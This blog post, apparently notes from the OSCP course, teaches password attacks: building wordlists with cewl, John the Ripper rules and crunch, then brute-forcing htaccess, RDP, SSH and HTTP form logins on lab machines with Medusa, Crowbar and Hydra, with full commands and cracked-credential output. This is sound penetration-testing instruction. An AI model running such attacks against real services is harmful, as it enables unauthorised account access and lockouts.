---
layout: post
title:  "OSCP Origin Part 19"
author: haran
categories: [oscp , security , oscp_origin]
image: post_img/oscp_origin/oscp.png
beforetoc: "Password Attacks"
toc: true
comments: false
rating: 3.5
---

Password Attacks

19. Password Attacks

19. Password Attacks


• Passwords are the most basic form of user account and service authentication and by extension,the goal of a password attack is to discover and use valid credentials in order to gain access to auser account or service.
 
• In general terms, there are a few common approaches to password attacks. 
 
• We can either make attempts at guessing a password through a dictionary attack  using various wordlists or we can brute force every possible character in a password.
  
• In general, a dictionary attack prioritizes speed, offering less password coverage,while brute force prioritizes password coverage at the expense of speed. Bothtechniques can be used effectively during an engagement, depending on ourpriorities and time requirements
  
• In some cases, once we gain (usually privileged) access to a target and we are able to extract password hashes, we can leverage password cracking attacks that seek to gain access to the clear text password, or Pass-the-Hash attacks, which allow us to authenticate to a Windows based target using only a username and the hash.
  
• In this module, we will discuss each of these concepts and techniques in more detail anddemonstrate how they can be leveraged in various attack scenarios.
19.1 Wordlists

19.1 Wordlists

• Wordlists, sometimes referred to as dictionary files, are simply text files containing words for useas input to programs designed to test passwords.

• Precision is generally more important than coverage when considering a dictionary attack, meaning it is more important to create a lean wordlist of relevant passwords than it is to create an enormous, generic wordlist.

• Because of this,many wordlists are based on a common theme, such as popular culture references, specific industries, or geographic regions and refined to contain commonly-used passwords. Kali Linux includes a number of these dictionary files in the /usr/share/wordlists/ directory and many more are hosted online.

• When conducting a password attack, it may be tempting to simply use these pre-built lists.
 
• However, we can be much more effective in our approach if we take the time to carefully build our own custom lists. 

• In this section, we will examine tools and approaches to create effectivewordlists.
19.1.1 Standard Wordlists

19.1.1 Standard Wordlists


• We can increase the effectiveness of our wordlists by adding words and phrases specific to our target organization.

• For example, consider MegaCorp One, a company that deals with nanotechnology. 

• The companywebsite, www.megacorpone.com, lists various products that the company sells, including the Nanobot. 

• In a hypothetical assessment, we were able to identify a low-level password of Nanobot93. Assuming this might be a common password format for this company, we would like to create a custom wordlist that identifies other passwords with a similar pattern, perhaps using other product names.

• We could browse the website and manually add commonly-used terms and product names to our custom wordlist, or we could use a tool like cewl to do the heavy lifting for us.

• As shown in the --help output, this tool can be configured by specifying several options, but we will focus on a fewkey arguments.

• For example, the following command scrapes the www.megacorpone.com web site, locates words with a minimum of six characters (-m 6), and writes (-w) the wordlist to a custom file (megacorpcewl.txt):

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/1.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/2.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/3.jpg)

kali@kali:~$ cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
kali@kali:~$ wc -l megacorp-cewl.txt
312
kali@kali:~$ grep Nano megacorp-cewl.txt
Nanotechnology
Nanomite
Nanoprobe
Nanoprocessors
NanoTimes
Nanobot

• The listing above shows that cewl located the name of several products, including the Nanobot. 

• We should consider the possibility that other product names may be used in passwords as well.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/4.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/5.jpg)

• However, these words by themselves would serve as extremely weak passwords, and would not meet typical password-enforcement rules.
 
• These types of rules generally require the use of upper and lower-case characters, the use of numbers, and perhaps special characters.
 
• Based on the password we have discovered (Nanobot93), we could surmise that the password enforcement for megacorpone requires at least the use of two numbers in the password, and may further dictate(however unlikely) that the numbers must be used at the end of the password.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/6.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/7.jpg)

• For the sake of this simple demonstration, we will assume that Megacorp One policy dictates that a password end in a two-digit number.

• To create passwords that meet this requirement, we could write a Bash script.

• However, we will instead use a much more powerful tool called John the Ripper (JTR),which is a fast password cracker with several features including the ability to generate custom wordlists and apply rule permutations.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/8.jpg)

kali@kali:~$ sudo nano /etc/john/john.conf
...
# Wordlist mode rules
[List.Rules:Wordlist]
# Try words as they are
:
# Lowercase every pure alphanumeric word
-c >3 !?X l Q
# Capitalize every pure alphanumeric word
-c (?a >2 !?X c Q
# Lowercase and pluralize pure alphabetic words
...
# Try the second half of split passwords
-s x_
-s-c x_ M l Q
# Add two numbers to the end of each password
$[0-9]$[0-9]
...

• Moving forward with our assumption about the password policy, we will add a rule to the JTRconfiguration file (/etc/john/john.conf) that will mutate our wordlist, appending two digits to eachpassword. 

• To do this, we must locate the [List.Rules:Wordlist] segment where wordlist mutation rules are defined, and append a new rule.

• In this example, we will append the two-digit sequence of numbers from (double) zero to ninety-nine after each word in our wordlist.

• We will begin this rule with the $ character, which tells John to append a character to the original word in our wordlist. 

• Next, we specify the type of character we want to append, in our case we want any number between zero and nine ([0-9]).

• Finally, to append double-digits, we will simply repeatthe $[0-9] sequence. 

• The final rule is shown in Listing.

• The rules syntax for John the Ripper is quite extensive and powerful, but beyondthe scope of this module. 

• For more information, take time to review the rulesdocumentation

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/9.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/10.jpg)

kali@kali:~$ john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
46446p 0:00:00:00 100.00% (2018-03-01 15:41) 663514p/s chocolate99
kali@kali:~$ grep Nanobot mutated.txt
...
Nanobot90
Nanobot91
Nanobot92
Nanobot93
Nanobot94
Nanobot95
Nanobot96
...

• Now that the rule has been added to the configuration file, we can mutate our wordlist, which currently contains 312 entries.

• To do this, we will invoke john and specify the dictionary file 
 (--wordlist=megacorp-cewl.txt),activate the rules in the configuration file 
 (--rules), output the results to standard output (--stdout), and redirect that output to a file called mutated.txt:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/11.jpg)

• The resulting file contains over 46000 password entries due to the multiple mutations performedon the passwords. 

• One of the passwords is “Nanobot93”, which matches the password we discovered earlier in our hypothetical assessment. 

• Given the assumptions about the MegaCorpOne password policy, this wordlist could produce results in a dictionary attack.

• Although this demonstration is over-simplified, it serves as a good example for how password profiling can be beneficial to the overall success of our password attacks.

19.1.1.1 Exercise

(Reporting is not required for this exercise)

1.Use cewl to generate a custom wordlist from your company, school, or favorite website andexamine the results. 

 Do any of your passwords show up?
19.2 Brute Force Wordlists

19.2 Brute Force Wordlists

• In contrast to a dictionary attack, a brute force password attack calculates and tests every possible character combination that could make up a password until the correct one is found. 
 
• While this may sound like a simple approach that guarantees results, it is extremely time-consuming.

• Depending on the length and complexity of the password and the computational power of thetesting system, it can take a very long time, even years, to brute force a strong password.

• We could even combine these two concepts and create brute force wordlists, dictionary files that contain every possible password that matches a specific pattern.

•For example, consider a scenario that reveals a very specific password enforcement policy as shown in Listing 

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/12.jpg)

kali@kali:~$ cat dumped.pass.txt
david: Abc$#123
mike: Jud()666
Judy: Hol&&278

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/13.jpg)

•Looking at the passwords, we notice the following pattern in the password structure:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/14.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/15.jpg)

• Armed with this knowledge, it would be incredibly helpful to create a wordlist that contains every possible password that matches this pattern.

• Crunch, included with Kali Linux, is a powerful wordlist generator that can handle this task.

• First, we must describe the pattern we need crunch to replicate, and for this we will use placeholders that represent specific types of characters:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/16.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/17.jpg)

• To generate a wordlist that matches our requirements, we will specify a minimum and maximum word length of eight characters (8 8) and describe our rule pattern with
 -t ,@@^^%%%:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/18.jpg)

kali@kali:~$ crunch 8 8 -t ,@@^^%%%
Crunch will now generate the following amount of data: 172262376000 bytes
164282 MB
160 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 19140264000
Aaa!!000
Aaa!!001
Aaa!!002
Aaa!!003
Aaa!!004
...

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/19.jpg)

kali@kali:~$ crunch 4 6 0123456789ABCDEF -o crunch.txt
Crunch will now generate the following amount of data: 124059648 bytes
118 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 17891328
crunch: 100% completed generating output
kali@kali:~$ head crunch.txt
0000
0001
0002
0003
0004
0005
0006
0007
0008

• The command works as expected, but as noted, the output would consume a massive 160 GB of disk space! Remember that brute force techniques prioritize password coverage at the expense of speed, and in this case, disk space.

• We can also define a character set with crunch.
  For example, we can create a brute force wordlist 

• accounting for passwords between four and six characters in length (4 6), containing only the characters 0-9 and A-F (0123456789ABCDEF), and we will write the output to a file (-ocrunch.txt):

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/20.jpg)

• Notice the file output size is significantly smaller than the previous example, primarily due to the shorter password length as well as the limited character set.

• However, the wordlist file is impressive, containing over 17 million passwords:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/21.jpg)

kali@kali:~$ wc -l crunch.txt
17891328 crunch.txt

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/22.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/23.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/24.jpg)

kali@kali:~$ crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
Crunch will now generate the following amount of data: 140712049920 bytes
134193 MB
131 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 20158125312 

• In addition, we can generate passwords based on pre-defined character-sets like those defined in /usr/share/crunch/charset.lst.

• For example, we can specify the path to the character set file 
 (-f /usr/share/crunch/charset.lst) and choose the mixed alpha set mixalpha, which includes all lower and upper case letters:

• Although this particular command generates an enormous 131 GB wordlist file, it offers rather impressive password coverage.

• Spend time with JTR and crunch and think of how each one can be used most effectively.

• As we will discover in the next section, we need to avoid the temptation to rely on massive and generic wordlists as they can have adverse effects on our client’s production environment.
19.2.1.1 Exercise

(Reporting is not required for this exercise)

1.Add a user on your Kali system and specify a complex password for the account that includes lower and upper case letters, numbers, and special characters. 

2.Use both crunch rule patterns and pre-defined character-sets in order to generate a wordlist that include that user’s password
19.3 Common Network Service Attack Methods

19.3 Common Network Service Attack Methods

• Now that we understand how to create effective wordlists for various situations, we can discuss how they can be used for password attacks against common network service.

• Bear in mind that password attacks against network services are noisy, and in some cases, dangerous.

•  Multiple failed login attempts will usually generate logs and warnings on the target system and may even lock out accounts after a predefined number of failed login attempts.

• This could be disastrous during a penetration test, preventing users from accessing production systems until an administrator re-enables the account. 

• Keep this in mind before blindly running a network-based brute force attack.

• Once we have weighed the risks and considered the well-being of the target network, we can take several steps to improve the efficiency of password tests.

• Depending on the protocol and password cracking tool, we can increase the number of login threads to boost the speed of an attack. 

• However, in some cases (such as RDP and SMB),increasing the number of threads may not be possible due to protocol restrictions, and our optimization attempt could instead slow down the process.

• On top of this, it is worth noting that the authentication negotiation process for protocols such as RDP are more time-consuming than, say, HTTP. 

• However, while attacking the RDP protocol maytake more time than attacking HTTP, a successful attack on RDP would often yield a bigger reward.

• The hidden art behind network service password attacks is choosing appropriate targets, user lists,and password files carefully and intelligently before initiating the attack.

• To successfully attack a password on a network service (such as HTTP, SSH, VNC, FTP, SNMP,and POP3), we must not only match the target username and password, but also honor the protocol involved in the authentication process.

• Fortunately, popular tools such as THC-Hydra, Medusa, Crowbar, and spray can handle these authentication requests for us.

• In this section, we will examine each of these tools and weigh their effective protocol and service handling capabilities.

• The tools mentioned in the following paragraphs mostly have similar capabilities and speeds.

• The “correct” tool to use often depends on the preferred syntax and output.

• This can only be determined by experimenting with each tool in a test environment and learning the strengths, weaknesses, and idio syncrasies of each.
19.3.1 HTTP htaccess Attack with Medusa

19.3.1 HTTP htaccess Attack with Medusa

• According to its authors, Medusa is intended to be a “speedy, massively parallel, modular, loginbrute forcer”.

• We will use Medusa to attempt to gain access to an htaccess-protected web directory

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/25.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/26.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/27.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/28.jpg)

• First, we will set up our target, an Apache webserver installed on our Windows client, which we will start through the XAMPP control panel. 
 
• We will attempt to gain access to an htaccess-protected folder, /admin, on that server.
 
• Our wordlist of choice for this example will be /usr/share/wordlists/rockyou.txt.gz, which we must first decompress with gunzip:

kali@kali:~$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/29.jpg)

• Next, we will launch medusa and initiate the attack against the htaccess-protected URL (-mDIR:/admin) on our target host with -h 10.11.0.22.

• We will attack the admin user (-u admin) with passwords from our rockyou wordlist file (-P /usr/share/wordlists/rockyou.txt and will, of course, use an HTTP authentication scheme (-M):


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/30.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/31.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/32.jpg)

kali@kali:~$ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http
-m DIR:/admin
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 123456 (1 of 14344391 com
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 12345 (2 of 14344391 comp
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 123456789 (3 of 14344391
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: password (4 of 14344391 c
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: iloveyou (5 of 14344391 c
...
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: samsung (255 of 14344391
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: freedom (256 of 14344391
ACCOUNT FOUND: [http] Host: 10.11.0.22 User: admin Password: freedom [SUCCESS]


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/33.jpg)

• In this case, Medusa discovered a working password of “freedom”.

• Medusa has many additional options and settings, as shown in the help output in Listing.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/34.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/35.jpg)

kali@kali:~$ medusa
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
ALERT: Host information must be supplied.
Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file]
-M module [OPT]
 -h [TEXT] : Target hostname or IP address
 -H [FILE] : File containing target hostnames or IP addresses
 -u [TEXT] : Username to test
 -U [FILE] : File containing usernames to test
 -p [TEXT] : Password to test
 -P [FILE] : File containing passwords to test
 -C [FILE] : File containing combo entries. See README for more information.
 -O [FILE] : File to append log information to
 -e [n/s/ns] : Additional password checks ([n] No Password, [s] Password = Username)
 -M [TEXT] : Name of the module to execute (without the .mod extension)
 -m [TEXT] : Parameter to pass to the module. This can be passed multiple times wi
 different parameter each time and they will all be sent to the module
 -m Param1 -m Param2, etc.)
 -d : Dump all known modules
 -n [NUM] : Use for non-default TCP port number
 -s : Enable SSL
 -g [NUM] : Give up after trying to connect for NUM seconds (default 3)
 -r [NUM] : Sleep NUM seconds between retry attempts (default 3)
 -R [NUM] : Attempt NUM retries before giving up. The total number of attempts wi
 -c [NUM] : Time to wait in usec to verify socket is available (default 500 usec)
 -t [NUM] : Total number of logins to be tested concurrently
 -T [NUM] : Total number of hosts to be tested concurrently
 -L : Parallelize logins using one username per thread. The default is to p
 the entire username before proceeding.
 -f : Stop scanning host after first valid username/password found.
 -F : Stop audit after first valid username/password found on any host.
 -b : Suppress startup banner
 -q : Display module's usage information
 -v [NUM] : Verbose level [0 - 6 (more)]
 -w [NUM] : Error debug level [0 - 10 (more)]
 -V : Display version
 -Z [TEXT] : Resume scan based on map of previous scan

• This tool can interact with a variety of network protocols, which can be displayed with the -d optionas shown in Listing  below.

kali@kali:~$ medusa -d
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 Available modules in "." :
 Available modules in "/usr/lib/medusa/modules" :
 + cvs.mod : Brute force module for CVS sessions : version 2.0
 + ftp.mod : Brute force module for FTP/FTPS sessions : version 2.1
 + http.mod : Brute force module for HTTP : version 2.1
 + imap.mod : Brute force module for IMAP sessions : version 2.0
 + mssql.mod : Brute force module for M$-SQL sessions : version 2.0
 + mysql.mod : Brute force module for MySQL sessions : version 2.0
 

19.3.1.1 Exercises

(Reporting is not required for these exercises)

1. Repeat the password attack against the htaccess protected folder.

2. Create a password list containing your Windows client password and use that to perform apassword attack again the SMB protocol on the Windows client.
19.3.2 Remote Desktop Protocol Attack with Crowbar

19.3.2 Remote Desktop Protocol Attack with Crowbar

• Crowbar, formally known as Levye, is a network authentication cracking tool primarily designed to leverage SSH keys rather than passwords. 
 
• It is also one of the few tools that can reliably and efficiently perform password attacks against the Windows Remote Desktop Protocol (RDP) service on modern versions of Windows.

• Let’s try this tool against our Windows client machine.First let’s install Crowbar from the Kali repository:
 
• First let’s install Crowbar from the Kali repository:
 
 kali@kali:~$ sudo apt install crowbar
Reading package lists... Done
Building dependency tree
Reading state information... Done
...
 
• To invoke crowbar, we will specify the protocol (-b), the target server (-s), a username (-u), awordlist (-C), and the number of threads (-n) as shown in Listing 606:
 
 kali@kali:~$ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
2019-08-16 04:51:12 START
2019-08-16 04:51:12 Crowbar v0.3.5-dev
2019-08-16 04:51:12 Trying 10.11.0.22:3389
2019-08-16 04:51:13 RDP-SUCCESS : 10.11.0.22:3389 - admin:Offsec!
2019-08-16 04:51:13 STOP
 
 -u = username
 -n = threads
 -C = password list
 
• Note that Crowbar discovered working credentials for the “admin” user.

• We specified a singlethread since the remote desktop protocol does not reliably handle multiple threads.
 
• To view additional supported protocols we can run crowbar with the --help flag:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/36.jpg)

kali@kali:~$ crowbar --help
usage: Usage: use --help for further information
Crowbar is a brute force tool which supports OpenVPN, Remote Desktop Protocol,
SSH Private Keys and VNC Keys.
positional arguments:
 options
optional arguments:
 -h, --help show this help message and exit
 -b {vnckey,sshkey,rdp,openvpn}, --brute {vnckey,sshkey,rdp,openvpn}
 Target service
 -s SERVER, --server SERVER
 Static target
 -S SERVER_FILE, --serverfile SERVER_FILE
 Multiple targets stored in a file
 -u USERNAME [USERNAME ...], --username USERNAME [USERNAME ...]
 Static name to login with
 -U USERNAME_FILE, --usernamefile USERNAME_FILE
  Multiple names to login with, stored in a file
 -n THREAD, --number THREAD
 Number of threads to be active at once
 -l FILE, --log FILE Log file (only write attempts)
 -o FILE, --output FILE
 Output file (write everything else)
 -c PASSWD, --passwd PASSWD
 Static password to login with
 -C FILE, --passwdfile FILE
 Multiple passwords to login with, stored in a file
 -t TIMEOUT, --timeout TIMEOUT
 [SSH] How long to wait for each thread (seconds)
 -p PORT, --port PORT Alter the port if the service is not using the default
 value
 -k KEY_FILE, --keyfile KEY_FILE
 [SSH/VNC] (Private) Key file or folder containing
multiple files
 -m CONFIG, --config CONFIG
 [OpenVPN] Configuration file
 -d, --discover Port scan before attacking open ports
 -v, --verbose Enable verbose output (-vv for more)
 -D, --debug Enable debug mode
 -q, --quiet Only display successful logins
 

this is the password file

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/37.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/38.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/39.jpg)

19.3.2.1 Exercise

(Reporting is not required for these exercises)

1. Create a password list containing your Windows client password and use that to repeat theabove Crowbar password attack against the Windows client
19.3.3 SSH Attack with THC-Hydra

19.3.3 SSH Attack with THC-Hydra


• THC-Hydra is another powerful network service attack tool under active development and it is worth mastering.

• We can use it to attack a variety of protocol authentication schemes, including SSH and HTTP.

• The standard options include -l to specify the target username, -P to specify a wordlist, and protocol://IP to specify the target protocol and IP address respectively.

• In this first example, we will attack our Kali VM.

• We will use the SSH protocol on our local machinessh://127.0.0.1, focus on the kali user (-l kali), and again use the rockyou wordlist (-P):

kali@kali:~$ hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret servic
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-07 08:35:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommende
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:143443
[DATA] attacking ssh://127.0.0.1:22/
[22][ssh] host: 127.0.0.1 login: kali password: whatever
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-07 08:36:13


• In this output, we can see that hydra discovered a valid login against the 
 local SSH server

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/40.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/41.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/42.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/43.jpg)

• THC-Hydra supports a number of standard protocols and services as shown in Listing 609:

kali@kali:~$ hydra
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret servic
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE]
[-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET
] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]
...
Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]
-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc
ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcany
where pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip
smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp





19.3.3.1 Exercise

(Reporting is not required for these exercises)

1. Recreate the Hydra SSH attack against your Kali VM.
19.3.4 HTTP POST Attack with THC-Hydra

19.3.4 HTTP POST Attack with THC-Hydra


• As an additional example, we will perform an HTTP POST attack against our Windows Apache server using Hydra.
 
• When a HTTP POST request is used for user login, it is most often through the use of a web form, which means we should use the “http-form-post” service module.
 
• We can supply the service name followed by -U to obtain additional information about the required arguments:


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/44.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/45.jpg)

kali@kali:~$ hydra http-form-post -U
...
Help for module http-post-form:
============================================================================
Module http-post-form requires the page and the parameters for the web form.
By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters take three ":" separated values, plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do
Syntax: <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
First is the page on the server to GET or POST to (URL).
Second is the POST/GET variables (taken from either the browser, proxy, etc.
with url-encoded (resp. base64-encoded) usernames and passwords being replaced in the
"^USER^" (resp. "^USER64^") and "^PASS^" (resp. "^PASS64^") placeholders (FORM PARAME
Third is the string that it checks for an *invalid* login (by default)
Invalid condition login check can be preceded by "F=", successful condition
login check must be preceded by "S=".
This is where most people get it wrong. You have to check the webapp what a
failed string looks like and put it in this parameter!
The following parameters are optional:
C=/page/uri to define a different page to gather initial cookies from
(h|H)=My-Hdr\: foo to send a user defined HTTP header with each request
 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
 Note: 'h' will add the user-defined header at the end
 regardless it's already being sent by Hydra or not.
 'H' will replace the value of that header if it exists, by the
 one supplied by the user, or add the header at the end
Note that if you are going to put colons (:) in your headers you should escape them wi
All colons that are not option separators should be escaped (see the examples above a
You can specify a header without escaping the colons, but that way you will not be ab
in the header value itself, as they will be interpreted by hydra as option separators
...


• From this output, we determine that we need to provide a number of arguments that will require usto perform some application discovery.

• First, we need the IP address and the URL of the webpage containing the web form on our Windows client. 

• The IP address will be provided as the firstargument to hydra.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/46.jpg)

• Next, we must understand the web form we want to brute force by inspecting the HTML code ofthe web page in question (located at /form/login.html).

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/47.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/48.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/49.jpg)

• Figure 294 shows the code of the target web form after right-clicking the page and selecting View Page Source from the context menu:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/50.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/51.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/52.jpg)

• The above form, part of the /form/login.html page, indicates that the POST request is handled by /form/frontpage.php, which is the URL we will feed to Hydra.

• The syntax displayed in Listing requires the form parameters, which in this case are user and pass.

•  Since we are attacking theadmin user login with a wordlist, the combined argument to Hydra becomes /form/frontpage.php:user=admin&pass=^PASS^, with ^PASS^ acting as a placeholder for our wordlist file entries.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/53.jpg)

• Putting these pieces together, we can complete the http-form-post syntax as given in Listing

http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN"



• The complete command can now be executed. 

• We will supply the admin user name (-l admin)and wordlist (-P), request verbose output with -vV, and use -f to stop the attack when the first successful result is found. 

• In addition, we will supply the service module name (http-form-post)and its required arguments (“/form/frontpage.php:user=admin&pass=^PASS^:INVALIDLOGIN”) as shown in Listing :

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/54.jpg)

-P             = wordlist
-vV  		   = verbose output
-f 			   = stop the attack first successful result found
http-form-post = service module name
/form/frontpage etc = required arguments.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/55.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/56.jpg)

kali@kali:~$ hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PAS
S^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret servic
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-07 15:55:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:143443
[DATA] attacking http-post-form://10.11.0.22/form/frontpage.php:user=admin&pass=^PASS^
:INVALID LOGIN
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "123456" - 1 of 14344399 [child 0]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "123456789" - 3 of 14344399 [child
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "password" - 4 of 14344399 [child 3
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "princess" - 6 of 14344399 [child 5
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "1234567" - 7 of 14344399 [child 6]
.....
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "karina" - 268 of 14344399 [child 1
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "dookie" - 269 of 14344399 [child 1
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "hotmail" - 270 of 14344399 [child
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "0123456789" - 271 of 14344399 [chi
[80][http-post-form] host: 10.11.0.22 login: admin password: crystal
[STATUS] attack finished for 10.11.0.22 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-07 15:55:29

• Although this required some investigation of the application, the result is worth it as a valid password was discovered.

• The other service modules included with Hydra are well worth the effort to master.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/19/57.jpg)

19.3.4.1 Exercises


(Reporting is not required for these exercises)

1.Run the HTTP POST password attack against the web form on your Windows client.

2.Perform a FTP password attack against the Pure-FTPd application on your local Kali Linuxmachine.
19.4 Leveraging Password Hashes

• Next, we turn our attention to attacks focused on the use of password hashes.

• A cryptographic hash function is a one-way function implementing an algorithm that, given an arbitrary block of data, returns a fixed-size bit string called a “hash value” or “message digest”.

• One of the most important uses of cryptographic hash functions is their application in password verification.
19.4.1 Retrieving Password Hashes

19.4.1 Retrieving Password Hashes

• Most systems that use a password authentication mechanism need to store these passwords locally on the machine.
 
• Rather than storing passwords in clear text, modern authentication mechanisms usually store them as hashes to improve security.

• This is true for operating systems,network hardware, and more. 

• This means that during the authentication process, the passwordpresented by the user is hashed and compared with the previously stored message digest.

• Identifying the exact type of hash without having further information about the program or mechanism that generated it can be very challenging and sometimes even impossible. 

• The Openwall website can help identify the source of various password hashes. When attempting to identify a message digest type, there are three important hash properties to consider.

•  These includethe length of the hash, the character set used in the hash, and any special characters used in the hash.

